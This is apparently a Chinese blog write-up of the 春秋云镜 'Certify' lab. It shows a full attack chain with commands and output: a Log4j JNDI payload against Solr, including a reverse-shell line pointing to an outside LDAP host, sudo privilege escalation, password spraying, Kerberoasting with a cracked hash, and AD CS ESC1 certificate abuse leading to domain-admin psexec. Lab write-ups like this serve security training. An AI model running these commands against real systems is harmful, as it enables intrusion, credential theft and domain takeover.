---
title: "春秋云镜 Certify Writeup"
date: 2023-08-05T16:48:02+08:00
lastmod: 2023-08-05T16:48:02+08:00
draft: false
author: "X1r0z"

tags: ['smb', 'windows', 'domain', 'adcs']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Certify Writeup

<!--more-->

## flag01

fscan

```shell
$ fscan ./fscan_darwin_arm64 -h 39.98.107.16
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.98.107.16    is alive
[*] Icmp alive hosts len is: 1
39.98.107.16:22 open
39.98.107.16:80 open
39.98.107.16:8983 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle: http://39.98.107.16       code:200 len:612    title:Welcome to nginx!
[*] WebTitle: http://39.98.107.16:8983  code:302 len:0      title:None 跳转url: http://39.98.107.16:8983/solr/
[*] WebTitle: http://39.98.107.16:8983/solr/ code:200 len:16555  title:Solr Admin
已完成 3/3
[*] 扫描结束,耗时: 37.743588333s
```

solr 8.11.0

![image-20230805141847279](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051418331.png)

试了一会发现存在 log4j2 jndi

```http
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.iu1oa6.dnslog.cn} HTTP/1.1
Host: 39.98.107.16:8983
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close


```

![image-20230805142126732](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051421764.png)

反弹 shell

```java
${jndi:ldap://124.71.184.68:1389/Basic/ReverseShell/IP/PORT}
```

![image-20230805143331353](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051433388.png)

suid 没东西

````shell
solr@ubuntu:/tmp$ find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
````

sudo 可以无密码执行 grc 命令

```shell
solr@ubuntu:/tmp$ sudo -l
Matching Defaults entries for solr on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User solr may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/grc
```

就是一个显示高亮的命令, 后面跟着要执行的原始命令

```shell
solr@ubuntu:/tmp$ grc
grc
Generic Colouriser 1.11.3
grc [options] command [args]
Options:
-e --stderr    redirect stderr. If this option is selected,
               do not automatically redirect stdout
-s --stdout    redirect stdout, even if -e is selected
-c name --config=name    use name as configuration file for grcat
--colour=word  word is one of: on, off, auto
--pty          run command in pseudoterminal (experimental)
```

提权

```shell
solr@ubuntu:/tmp$ sudo grc whoami
root
```

flag01

![image-20230805143817615](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051438650.png)

## flag02

内网 fscan

```shell
solr@ubuntu:/tmp$ ./fscan -h 172.22.9.0/24
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.9.7      is alive
(icmp) Target 172.22.9.19     is alive
(icmp) Target 172.22.9.26     is alive
(icmp) Target 172.22.9.47     is alive
[*] Icmp alive hosts len is: 4
172.22.9.19:22 open
172.22.9.47:21 open
172.22.9.26:445 open
172.22.9.47:445 open
172.22.9.7:445 open
172.22.9.47:139 open
172.22.9.26:139 open
172.22.9.7:139 open
172.22.9.26:135 open
172.22.9.7:135 open
172.22.9.47:80 open
172.22.9.7:80 open
172.22.9.47:22 open
172.22.9.19:80 open
172.22.9.7:88 open
172.22.9.19:8983 open
[*] alive ports len is: 16
start vulscan
[*] NetInfo:
[*]172.22.9.26
   [->]DESKTOP-CBKTVMO
   [->]172.22.9.26
[*] NetBios: 172.22.9.7      [+]DC XIAORANG\XIAORANG-DC     
[*] NetInfo:
[*]172.22.9.7
   [->]XIAORANG-DC
   [->]172.22.9.7
[*] NetBios: 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393 
[*] WebTitle: http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[*] NetBios: 172.22.9.47     fileserver                          Windows 6.1 
[*] WebTitle: http://172.22.9.19        code:200 len:612    title:Welcome to nginx!
[*] 172.22.9.47  (Windows 6.1)
[*] WebTitle: http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/
[*] WebTitle: http://172.22.9.7         code:200 len:703    title:IIS Windows Server
[*] WebTitle: http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin
[+] http://172.22.9.7 poc-yaml-active-directory-certsrv-detect 
```

整理信息

```shell
172.22.9.7 XIAORANG-DC 80,88 AD CS
172.22.9.19 本机
172.22.9.26 DESKTOP-CBKTVMO
172.22.9.47 fileserver, 21,80,22,445
```

172.22.9.47 是 ubuntu, 开启了 smb

尝试匿名登录

```shell
proxychains smbclient.py 172.22.9.47
```

![image-20230805145946563](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051459588.png)

flag02

![image-20230805150007213](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051500247.png)

## flag03 & flag04

下载 smb 共享里面的 personnel.db

![image-20230805150317298](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051503337.png)

![image-20230805150326557](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051503601.png)

根据上文的提示猜测要打 AD CS, 但是现在还没有域用户凭据

`xr_users` 表还有三个加了星号的用户, 密码已知

将上面的用户名和密码保存下来, 先枚举用户

![image-20230805150631322](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051506365.png)

一共 91 个有效用户名

```shell
2023/08/05 15:08:22 >  Done! Tested 310 usernames (91 valid) in 162.370 seconds
```

然后分别对这三个密码进行密码喷洒

```shell
proxychains ./kerbrute_darwin_amd64 passwordspray --dc 172.22.9.7 -d xiaorang.lab ~/user.txt i9XDE02pLVf
proxychains ./kerbrute_darwin_amd64 passwordspray --dc 172.22.9.7 -d xiaorang.lab ~/user.txt 6N70jt2K9sV
proxychains ./kerbrute_darwin_amd64 passwordspray --dc 172.22.9.7 -d xiaorang.lab ~/user.txt fiAzGwEMgTY
```

最终成功喷洒出两个用户

```shell
2023/08/05 15:14:52 >  [+] VALID LOGIN:	 zhangjian@xiaorang.lab:i9XDE02pLVf
2023/08/05 15:18:35 >  [+] VALID LOGIN:	 liupeng@xiaorang.lab:fiAzGwEMgTY
```

根据提示, 先枚举 SPN

```shell
proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf
```

![image-20230805152638707](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051526755.png)

*这里只跑了 chenchen 用户, 因为当时把 zhangxia 看成 zhangjian 了... 实际上后面利用 zhangxia 用户可以配置到域控的 RBCD*

请求 ST

```shell
proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen
```

```
$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$5f2dc0367479fb83a6dd3f5c05b12249$176d7003dc78eca9f2d2af218015c4a11769d1424c5ec0247974822056d470da1ac63d6d7ca129c418944cabbde35d79be86c01783069cf62948323d7ca2ed1e6a44a51008302daa11e3b92792c63d21611a3f03d2ea56ed2d27e702f3da7f68c7b00e0f37a495a3e0d1ba1386edc6c6e3338dc9f089b7e2f8ce9da3dcaea7cfd29a43c32e2b6a42a2cedf2372db87f5b78584e96ba0642a335bddbc8d6adab3391696065b6fe671ad050d81f90b78793287c569dec4a7d7403fe540bfb0038403b54e26d0083c921d838c81f094598dfe46a3dd58d6d2478d609c7bdbfb2be184c6c944887f9d2dd67fb5a47a071ae956c5fc59aa9cdef9b80a475129fb3827bb7d60e91be02182db45ea97bbeaf6416919ce41ffa8b1b9b03e6b462aa9a24437df2751a8dfd9f7744f07b4e37370f34eecfbe23ee20ef914121eff07ce7cdeec50928a4dbf2b7261a7143046571d9fa909f49912f57a20b36f5984a93bf1bf2aa6c42e38e811a60bac901ca594ea9d3070ca3a495ed1ef0f356524c1123f6f30e5498e39560c1d0b9bdd42c8f46417106b398401a4e6255fb937554f4788633d5b175c0e7809af1c071eaffc88b5b5fa749bda14ff523015fd1e4d72ce95d0aa2632ee6383d07f7218964011dcd8108aef2e21ef44de28cc279ff9dc1a9ab148328595494bf64df1a26660002d2918201ac2728458d8cc735c37cbf4f574115a09679109538b867c1f12921f1c547dac6b102b880259f0fb3771dcaec58399d2c2eba435a55c7d38e2607541053ad6fbec89cf0ece0f9c7440476725d69e26ff38a91c2431840f09faccaf64c4b172659150d66d4ca8560d23e4b6d20c1929d4f574cdbfa17a0041ff94fd9783e23f26a7fafaaabac79e141b2873e52718c36bfce146d0082746697b5ffb264dfe0daf05237391fefc1b0a442744f9eade5f96bc66af722d50e68065d8b9dd8124b4053a0a7e82c7b0ed47716998f143b364767a164879cff9d9c6687e722162a0ed021ad6dde26abe73e8a63e9c11737b273e787cb96e71744d154944981ea27b54d10c61858014c3ff6f66cdbe8c7aeb3b7148b6793054b3faacddb06ce64c553e0a3223db0eba3787716243cdc1aa263df5f9bca5a1289e77c53a6c16e5ecf07effa50db66554b7747da27989ab267cff41d8df94eee9b7206e4e0afa26d79ae4b5b205966f26d39706143bca18e8d0057094b09fcac279815dbd5b6e2d4680a7b6ac63f9805689f13a78bea35a3da64a138694ecf357a4c81f47692459b5d22e818cb5cf68da0566b8250455b93bc57221467e3f1ae1d99957ed07450f70cc89ee802fdb7c7db79fc563abfc91d9ad8dabcd09b271f455fe2443162bac4740aca90af3686ff9c3f9e1e7db8011c86fabe1c9115f009f2f12d7b256ffc8f1344b12d42accfe23409e901cc35a86de6b50473464d1d3a19ba33712406a9d64430a17a1edfa3b08ce3c11612a8b6d85d3e4145fe965bfc9ac89101bc66026ef
```

hashcat 跑 rockyou

```shell
hashcat -a 0 -m 13100 spn.txt ~/Tools/字典/rockyou.txt
```

![image-20230805152835509](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051528561.png)

```
xiaorang.lab/chenchen:@Passw0rd@
```

rdp 登录

![image-20230805153013015](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051530071.png)

BloodHound

![image-20230805153600106](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051536163.png)

zhangxia 对 XIAORANG-DC 具有 GenericWrite 权限, 可以配置 RBCD, 不过下面没用到

AD CS 信息

![image-20230805153810564](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051538616.png)

Certipy 跑一遍可以利用的证书

```shell
$ proxychains certipy find -u 'liupeng@xiaorang.lab'  -password 'fiAzGwEMgTY' -dc-ip 172.22.9.7 -vulnerable -stdout
[proxychains] config file found: /usr/local/etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.dylib
[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via RRP
[*] Got CA configuration for 'xiaorang-XIAORANG-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : xiaorang-XIAORANG-DC-CA
    DNS Name                            : XIAORANG-DC.xiaorang.lab
    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab
    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5
    Certificate Validity Start          : 2023-07-14 04:33:21+00:00
    Certificate Validity End            : 2028-07-14 04:43:21+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : XIAORANG.LAB\Administrators
      Access Rights
        ManageCa                        : XIAORANG.LAB\Administrators
                                          XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        ManageCertificates              : XIAORANG.LAB\Administrators
                                          XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        Enroll                          : XIAORANG.LAB\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : XR Manager
    Display Name                        : XR Manager
    Certificate Authorities             : xiaorang-XIAORANG-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Domain Users
                                          XIAORANG.LAB\Enterprise Admins
                                          XIAORANG.LAB\Authenticated Users
      Object Control Permissions
        Owner                           : XIAORANG.LAB\Administrator
        Write Owner Principals          : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
                                          XIAORANG.LAB\Administrator
        Write Dacl Principals           : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
                                          XIAORANG.LAB\Administrator
        Write Property Principals       : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
                                          XIAORANG.LAB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'XIAORANG.LAB\\Domain Users' and 'XIAORANG.LAB\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
```

虽然默认也有 ESC8, 但是因为 AD DS 和 AD CS 是在同一台机器上的, 所以无法进行 NTLM Relay

下面利用 ESC1

申请 `XR Manager` 证书模版并伪造域管理员

```shell
proxychains certipy req -u 'liupeng@xiaorang.lab' -p 'fiAzGwEMgTY' -target 172.22.9.7 -dc-ip 172.22.9.7 -ca 'xiaorang-XIAORANG-DC-CA' -template 'XR Manager' -upn 'administrator@xiaorang.lab'
```

![image-20230805161230845](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051612906.png)

利用证书获取 TGT 和 NTLM Hash

```shell
proxychains certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7
```

![image-20230805161309102](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051613173.png)

psexec 拿到 flag03 和 flag04

```shell
proxychains psexec.py -k -no-pass DESKTOP-CBKTVMO.xiaorang.lab -dc-ip 172.22.9.7
proxychains psexec.py -k -no-pass XIAORANG-DC.xiaorang.lab -dc-ip 172.22.9.7
```

![image-20230805161458479](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051614542.png)

![image-20230805161552786](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308051615860.png)